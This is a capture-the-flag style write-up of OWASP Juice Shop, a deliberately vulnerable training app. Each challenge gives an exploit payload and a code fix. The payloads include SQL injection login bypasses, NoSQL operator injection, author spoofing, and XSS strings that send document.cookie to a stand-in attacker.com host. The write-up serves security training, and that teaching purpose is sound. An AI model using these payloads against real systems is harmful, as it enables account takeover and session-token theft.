About This Writeup

OWASP Juice Shop is an intentionally vulnerable web application used for security training. This writeup documents vulnerabilities I discovered and exploited, how each attack works mechanically, and the fixes required to remediate them. Each challenge includes the actual exploit payload used and a concrete code-level fix.

CRITICAL SQLi Injection

Admin Login via SQL Injection

Bypass authentication entirely using a crafted email payload

The login endpoint passes the user-supplied email directly into a SQL query without sanitization. By injecting SQL syntax into the email field, the password check can be completely bypassed.

Exploit
POST /rest/user/login
{
  "email": "admin' OR TRUE --",
  "password": "anything"
}

The ' closes the email string, OR TRUE makes the WHERE clause always true, and -- comments out the password check entirely.

ERROR LEAK (server exposed the raw SQL)

SELECT * FROM Users WHERE email = 'admin OR '1=1 --'
AND password = '21232f...' AND deletedAt IS NULL

The server returned the full SQL query in its error response — a secondary vulnerability that made solving this trivial.

Fix
// ❌ Vulnerable — string interpolation
db.query(`SELECT * FROM Users WHERE email = '${email}'`)

// ✅ Safe — parameterized query
db.query('SELECT * FROM Users WHERE email = ?', [email])

// ✅ Also — never expose SQL errors to the client
res.status(500).json({ error: 'Authentication failed' })
// not: res.status(500).json({ error: err.message, sql: err.sql })
Key Lesson: Parameterized queries treat user input as pure data, never as SQL syntax. The '-- becomes a literal string to match, not a query terminator. Error messages must never expose internal query structure.
HIGH XSS DOM-Based

DOM-Based XSS via Search Parameter

Inject HTML via location.hash — never touches the server

Angular reads location.hash to handle routing in this SPA. The search component takes the q parameter and renders it directly into the DOM using innerHTML — without any sanitization. Since everything after # stays in the browser and never reaches the server, this is a pure DOM-based attack.

Exploit — Cookie Exfiltration
http://localhost:3000/#/search?q=<img src=x onerror="new Image().src='https://attacker.com/steal?c='%2Bdocument.cookie">

The img tag's src=x intentionally fails, triggering onerror which silently sends document.cookie (including the JWT) to the attacker's endpoint. Victim just has to click the link.

WHY img onerror?

Not blocked by CORS. Works in all browsers. Only one encoding layer to survive. More reliable than javascript: URIs in iframe src.

WHY # hash?

The browser never sends the #fragment to the server. Only JS can read it via location.hash. Invisible to server-side WAFs and logs.

Fix
// ❌ Vulnerable sink
element.innerHTML = location.hash.slice(1)

// ✅ Use textContent — treats input as plain text
element.textContent = location.hash.slice(1)

// ✅ If HTML rendering is required, sanitize first
element.innerHTML = DOMPurify.sanitize(userInput)

// ✅ Angular: use {{ }} not [innerHTML]
<p>{{ searchQuery }}</p>  // auto-escaped

ADDITIONAL DEFENSES

✓ HttpOnly cookies — makes document.cookie return empty even if XSS fires
✓ CSP — connect-src 'self' blocks exfiltration to external endpoints
✓ Short JWT expiry — limits damage window if token is stolen
HIGH XSS Reflected

Reflected XSS via Order Tracking ID

Server echoes the payload back in its HTML response

The order tracking endpoint takes an id query parameter, passes it to the server, and the server reflects it back unsanitized in the HTML response. Unlike DOM XSS, this payload makes a real HTTP round trip — the server processes it and injects it into the page markup it returns.

Exploit
http://localhost:3000/#/track-result?id=%3Ciframe%20src%3D%22javascript:alert(%60xss%60)%22%3E

# Decoded: ?id=<iframe src="javascript:alert(`xss`)">

Note: requires a page reload because Angular (SPA) doesn't immediately fire an HTTP request. The reload forces a real server call that returns the reflected payload.

DOM XSS vs REFLECTED XSS

PropertyDOM XSSReflected XSS
Hits server?NeverYes
In server logs?NoYes
URL indicator# hash? param
WAF catchable?Very hardMuch easier
Fix
// ❌ Vulnerable — raw param in response
res.send(`<p>Tracking: ${req.query.id}</p>`)

// ✅ Validate — id should only be alphanumeric
if (!/^[a-zA-Z0-9-]+$/.test(req.query.id)) {
  return res.status(400).send('Invalid order ID')
}

// ✅ Output encode before inserting into HTML
const safe = req.query.id
  .replace(/&/g, '&amp;')
  .replace(/</g, '&lt;')
  .replace(/>/g, '&gt;')
res.send(`<p>Tracking: ${safe}</p>`)
CRITICAL XSS Stored

Stored XSS via Product Description API

Payload persists in database — every visitor is a victim

By intercepting a product update request in Burp Suite, I modified the description field of a product to include a malicious <img onerror> payload. The API saved this raw HTML to the database. Angular then renders the description using [innerHTML], executing the payload for every user who views the product — no phishing link required.

Exploit — Burp Suite Intercept
PUT /api/Products/1
{
  "description": "<img src=x onerror='new Image().src=\"https://attacker.com/steal?c=\"+document.cookie'>"
}

Why this is CRITICAL: This is a passive attack. After the one-time injection, the attacker does nothing. Every user who clicks "Apple Pomace" silently exfiltrates their JWT to the attacker's server. Including admins. No crafted link, no phishing, no interaction needed from the attacker.

Fix
// ✅ Sanitize on ingest — strip HTML at the API layer
const DOMPurify = require('isomorphic-dompurify')
const clean = DOMPurify.sanitize(req.body.description)
db.product.update({ description: clean })

// ✅ Angular template — use interpolation, not innerHTML
<p>{{ product.description }}</p>   // safe
<p [innerHTML]="product.description"></p>  // dangerous

// ✅ If innerHTML is needed, sanitize client-side too
import DOMPurify from 'dompurify'
element.innerHTML = DOMPurify.sanitize(product.description)
Rule: The database storing HTML is not inherently the vulnerability — it's the frontend trusting that stored HTML enough to render it without sanitization. Sanitize on both ingress (API) and egress (render). Never rely on only one.
HIGH Injection NoSQL

NoSQL Injection on Review Endpoint

MongoDB operator injection to modify other users' reviews

The review update endpoint at /rest/products/reviews passes the id field directly into a MongoDB query. By supplying a JSON object with a $in operator instead of a plain string, I was able to update multiple users' reviews simultaneously using admin credentials.

Exploit
PATCH /rest/products/reviews
{
  "message": "hacked review",
  "id": {
    "$in": [
      "5HhCCHJeLokngSmEj",
      "3PSWpjP49bPMZfyuy"
    ]
  }
}

Instead of matching a single review by ID, $in matches any document whose _id is in the array — overwriting multiple reviews in one request.

Fix
// ❌ Vulnerable — object passed directly to DB
db.reviews.update({ _id: req.body.id }, { message: req.body.message })

// ✅ Validate type before querying
if (typeof req.body.id !== 'string') {
  return res.status(400).json({ error: 'Invalid id format' })
}

// ✅ Or enforce schema with Joi
const schema = Joi.object({
  id: Joi.string().required(),
  message: Joi.string().max(500).required()
})
const { error } = schema.validate(req.body)
if (error) return res.status(400).json({ error: error.message })
MEDIUM Access Control

Post Review as Any User

API trusts client-supplied author identity

The review creation endpoint accepts an author field in the request body and uses it directly, without cross-checking it against the authenticated session. Any logged-in user can impersonate any other user by simply changing the author value.

Exploit
PUT /rest/products/1/reviews HTTP/1.1
Authorization: Bearer <your_jwt>

{
  "message": "Terrible product!",
  "author": "victim@juice-sh.op"
}
Fix
// ❌ Vulnerable — trusts client-provided author
db.reviews.insert({ message: req.body.message, author: req.body.author })

// ✅ Ignore author from body — extract from verified JWT
const author = req.user.email  // decoded from JWT server-side
db.reviews.insert({ message: req.body.message, author })
Rule: The client should never be trusted to declare who they are. Identity must always come from the server-verified JWT or session token — never from the request body.
MEDIUM Access Control

Admin Can Delete Any User's Review

Role check without ownership check

The admin panel allows deleting any review. The endpoint checks that the user is an admin, but never verifies that the admin owns the review. Delete authorization should be restricted to the original author only — admin role should not override ownership for user-generated content.

Fix
// ❌ Only checks role — not ownership
if (req.user.role === 'admin') {
  db.reviews.delete({ _id: req.params.id })
}

// ✅ Check ownership regardless of role
const review = await db.reviews.findOne({ _id: req.params.id })

if (!review) return res.status(404).json({ error: 'Not found' })

if (review.author !== req.user.email) {
  return res.status(403).json({ error: 'Forbidden — not your review' })
}

await db.reviews.delete({ _id: req.params.id })
Role vs Ownership: Roles describe what type of user someone is. Ownership describes whether a specific resource belongs to them. Both checks must exist independently — a role of "admin" does not automatically confer ownership over another user's data.
CRITICAL SQLi Access Control

Login as Any User via SQL Comment Injection

Obtain JWT for any account — enables credential reset

By entering a known username followed by '--, the password check condition in the SQL query is commented out. The server returns a valid JWT for the targeted account, which can be decoded to retrieve credentials and used to take over the account or trigger a password reset.

Exploit
{
  "email": "jim@juice-sh.op'--",
  "password": "anything"
}

// Resulting SQL:
SELECT * FROM Users WHERE email = 'jim@juice-sh.op'
--' AND password = '...' AND deletedAt IS NULL
// Everything after -- is ignored → login succeeds

The response contains a full JWT. Decode it at jwt.io to extract the user's email, hashed password, and role.

Fix
// ❌ Vulnerable
db.query(`SELECT * FROM Users WHERE email = '${email}' AND password = '${hash}'`)

// ✅ Parameterized query — makes '-- a literal string
db.query(
  'SELECT * FROM Users WHERE email = ? AND password = ? AND deletedAt IS NULL',
  [email, hash]
)
